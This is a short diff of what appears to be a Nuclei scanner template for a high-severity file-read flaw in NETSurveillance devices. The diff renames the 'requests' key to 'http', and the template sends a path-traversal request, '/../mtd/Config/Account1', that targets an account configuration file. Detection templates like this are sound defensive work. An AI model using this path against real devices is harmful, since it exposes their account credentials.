@@ -6,7 +6,7 @@ info:
   severity: high
   tags: NETSurveillance,fileRead
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/../mtd/Config/Account1"
